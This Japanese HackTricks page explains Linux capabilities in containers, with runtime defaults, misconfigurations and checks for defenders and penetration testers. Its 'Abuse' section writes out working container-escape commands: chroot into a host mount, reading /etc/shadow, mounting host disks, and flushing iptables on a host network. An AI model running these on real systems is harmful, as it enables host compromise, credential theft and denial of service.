# コンテナ内の Linux Capabilities

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

Linux capabilities は、コンテナ security における最も重要な要素の一つです。なぜなら、次の微妙ですが根本的な疑問に答えるものだからです。**コンテナ内で「root」とは、実際には何を意味するのか？** 通常の Linux system では、UID 0 は歴史的に非常に広範な privilege set を意味していました。現代の kernel では、この privilege は capabilities と呼ばれる、より小さな単位に分解されています。関連する capabilities が削除されていれば、process は root として実行されていても、多くの強力な操作を実行できません。

Containers は、この区別に大きく依存しています。互換性や簡便性の理由から、多くの workload は現在でもコンテナ内で UID 0 として起動されます。capability dropping がなければ、これは非常に危険です。capability dropping を行えば、containerized root process はコンテナ内で通常の多くのタスクを実行しながら、より機密性の高い kernel 操作を拒否されます。そのため、コンテナ shell に `uid=0(root)` と表示されても、それだけで「host root」や「広範な kernel privilege」を意味するわけではありません。その root identity に実際にどれだけの価値があるかは、capability sets によって決まります。

Linux capability の完全な reference と多くの abuse examples については、以下を参照してください。

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## 操作

Capabilities は、permitted、effective、inheritable、ambient、bounding sets など、複数の sets で追跡されます。多くの container assessments では、各 set の正確な kernel semantics よりも、最終的な実用上の疑問のほうがすぐに重要です。**この process は現在、どの privileged operations を正常に実行でき、今後どの privilege gains がまだ可能なのか？**

これが重要なのは、多くの breakout techniques が、実際には container problems に偽装された capability problems だからです。`CAP_SYS_ADMIN` を持つ workload は、通常の container root process が触れるべきではない膨大な kernel functionality にアクセスできます。`CAP_NET_ADMIN` を持つ workload は、host network namespace も共有している場合、さらに危険になります。`CAP_SYS_PTRACE` を持つ workload は、host PID sharing によって host processes を確認できる場合、特に注目すべき対象になります。Docker や Podman では、これは `--pid=host` として現れることがあります。Kubernetes では通常、`hostPID: true` として現れます。

つまり、capability set を単独で評価することはできません。namespaces、seccomp、MAC policy と合わせて読み取る必要があります。

## Lab

コンテナ内の capabilities を確認する非常に直接的な方法は次のとおりです。
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
より制限の厳しいコンテナと、すべての capabilities が追加されたコンテナを比較することもできます：
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
限定的な追加の効果を確認するには、すべてを削除し、1つの capability だけを戻してみます:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
これらの小さな実験は、runtime が単に「privileged」という名前の boolean を切り替えているわけではないことを示すのに役立ちます。runtime は、process で利用可能な実際の privilege surface を形作っています。

## High-Risk Capabilities

target によって重要になる capabilities は数多くありますが、container escape の分析で繰り返し関連するものがいくつかあります。

**`CAP_SYS_ADMIN`** は、defender が最も警戒すべき capability です。これは、mount 関連の操作、namespace に依存する挙動、そして container に安易に公開すべきではない多くの kernel path など、膨大な機能を解放するため、「the new root」と表現されることがよくあります。container に `CAP_SYS_ADMIN`、弱い seccomp、強力な MAC confinement の欠如がある場合、多くの classic breakout path がはるかに現実的になります。

**`CAP_SYS_PTRACE`** は、process の可視性が存在する場合に重要です。特に PID namespace が host や、関心のある隣接 workload と共有されている場合に問題になります。これは可視性を tampering に変える可能性があります。

**`CAP_NET_ADMIN`** と **`CAP_NET_RAW`** は、network に重点を置く環境で重要です。分離された bridge network 上でもすでに危険になり得ますが、host の network namespace を共有している場合はさらに危険です。workload が host の networking を再構成したり、sniff、spoof、または local traffic flow に干渉したりできる可能性があるためです。

**`CAP_SYS_MODULE`** は、rootful environment では通常、壊滅的な結果を招きます。kernel module のロードは、事実上 host kernel の control を意味するためです。general-purpose container workload にこれが設定されることは、ほぼ決してあってはなりません。

## Runtime Usage

Docker、Podman、containerd-based stack、CRI-O はすべて capability control を使用しますが、default と management interface は異なります。Docker では、`--cap-drop` や `--cap-add` などの flag を通じて非常に直接的に設定できます。Podman でも同様の control を利用でき、rootless execution を追加の safety layer として活用できることが多いです。Kubernetes では、Pod または container の `securityContext` を通じて capability の追加と削除を指定します。LXC/Incus などの system-container environment も capability control に依存しますが、これらの system は host との統合範囲が広いため、operator は app-container environment の場合よりも積極的に default を緩和しがちです。

同じ原則がすべての環境に当てはまります。技術的に grant 可能な capability が、必ずしも grant すべき capability とは限りません。現実の incident の多くは、より厳格な configuration で workload が失敗し、team が迅速な修正を必要としたため、operator が namespace、seccomp、mount への影響を理解しないまま capability を追加することから始まります。

## Misconfigurations

最も明白な間違いは、Docker/Podman-style CLI で **`--cap-add=ALL`** を指定することですが、それだけではありません。実際には、極めて強力な capability を 1 つか 2 つ、特に `CAP_SYS_ADMIN` を、「application を動作させる」ために付与しながら、namespace、seccomp、mount への影響を理解していないことのほうが、より一般的な問題です。もう 1 つのよくある failure mode は、追加の capability と host namespace sharing を組み合わせることです。Docker や Podman では、これは `--pid=host`、`--network=host`、または `--userns=host` として現れる場合があります。Kubernetes では、通常、`hostPID: true` や `hostNetwork: true` などの workload setting によって同等の exposure が発生します。これらの各組み合わせによって、その capability が実際に影響を及ぼせる範囲が変わります。

また、workload が完全な `--privileged` ではないため、依然として意味のある制約を受けていると administrator が考えていることもよくあります。それが正しい場合もありますが、実効的な posture がすでに privileged に十分近く、運用上その違いが意味を持たなくなっている場合もあります。

## Abuse

最初の実践的な step は、effective capability set を列挙し、escape または host information access に関係する capability-specific action をすぐに test することです:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
`CAP_SYS_ADMIN` が存在する場合は、mount-based abuse とホストファイルシステムへのアクセスを最初にテストしてください。これは最も一般的な breakout の要因の 1 つです。
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
`CAP_SYS_PTRACE` が存在し、container から興味深い process が見える場合、この capability を process inspection に利用できるか確認します：
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
`CAP_NET_ADMIN` または `CAP_NET_RAW` が存在する場合、workload が可視ネットワークスタックを操作できるか、少なくとも有用なネットワーク情報を収集できるかをテストします：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Capability test が成功した場合は、namespace の状況と組み合わせて考えます。分離された namespace 内では単にリスクがあるように見える capability でも、container が host PID、host network、または host mounts を共有している場合、直ちに escape や host-recon の primitive になり得ます。

### Full Example: `CAP_SYS_ADMIN` + Host Mount = Host Escape

container に `CAP_SYS_ADMIN` と、`/host` などの host filesystem への書き込み可能な bind mount がある場合、escape path は多くの場合、単純です。
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
`chroot` が成功すると、コマンドはホストの root filesystem コンテキストで実行されるようになります:
```bash
id
hostname
cat /etc/shadow | head
```
`chroot` が利用できない場合、マウントされたツリーを介してバイナリを呼び出すことで、同じ結果を得られることがよくあります。
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### 完全な例: `CAP_SYS_ADMIN` + デバイスアクセス

ホストのブロックデバイスが公開されている場合、`CAP_SYS_ADMIN` によってホストのファイルシステムへ直接アクセスできるようになります:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### 完全な例: `CAP_NET_ADMIN` + Host Networking

この組み合わせは常に直接ホストの root を取得できるわけではありませんが、ホストのネットワークスタックを完全に再構成できます:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
それにより、denial of service、traffic interception、または以前はフィルタリングされていたサービスへのアクセスが可能になる場合があります。

## Checks

capability checksの目的は、raw valuesをdumpすることだけではなく、プロセスが現在のnamespaceとmountの状況を危険なものにできるだけの十分な権限を持っているかを把握することです。
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
ここで重要な点:

- `capsh --print` は、`cap_sys_admin`、`cap_sys_ptrace`、`cap_net_admin`、`cap_sys_module` などの高リスクな capabilities を見つける最も簡単な方法です。
- `/proc/self/status` の `CapEff` 行は、他のセットで利用できる可能性があるものではなく、現在実際に有効なものを示します。
- コンテナが host PID、network、user namespaces も共有している場合、または書き込み可能な host mounts がある場合、capability dump はさらに重要になります。

raw capability 情報を収集したら、次のステップは解釈です。プロセスが root か、user namespaces が有効か、host namespaces が共有されているか、seccomp が enforcing 状態か、AppArmor または SELinux が依然としてプロセスを制限しているかを確認します。capability set だけでは全体像の一部にすぎませんが、同じように見える開始地点から、ある container breakout が成功し、別のものが失敗する理由を説明する要素になることがよくあります。

## Runtime のデフォルト

| Runtime / platform | デフォルト状態 | デフォルトの動作 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトで削減された capability set | Docker は capabilities のデフォルト allowlist を保持し、それ以外を drop します | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--cap-add=ALL`、`--privileged` |
| Podman | デフォルトで削減された capability set | Podman containers はデフォルトで unprivileged であり、削減された capability model を使用します | `--cap-add=<cap>`、`--cap-drop=<cap>`、`--privileged` |
| Kubernetes | 変更されない限り Runtime のデフォルトを継承 | `securityContext.capabilities` が指定されていない場合、container は Runtime のデフォルト capability set を取得します | `securityContext.capabilities.add`、`drop: [\"ALL\"]` を指定しない、`privileged: true` |
| Kubernetes 上の containerd / CRI-O | 通常は Runtime のデフォルト | 有効な set は Runtime と Pod spec の組み合わせによって決まります | Kubernetes の行と同じ。直接の OCI/CRI 設定で capabilities を明示的に追加することも可能です |

Kubernetes で重要なのは、API が単一の普遍的なデフォルト capability set を定義していない点です。Pod が capabilities を add または drop しない場合、workload はその node の Runtime のデフォルトを継承します。
{{#include ../../../../banners/hacktricks-training.md}}
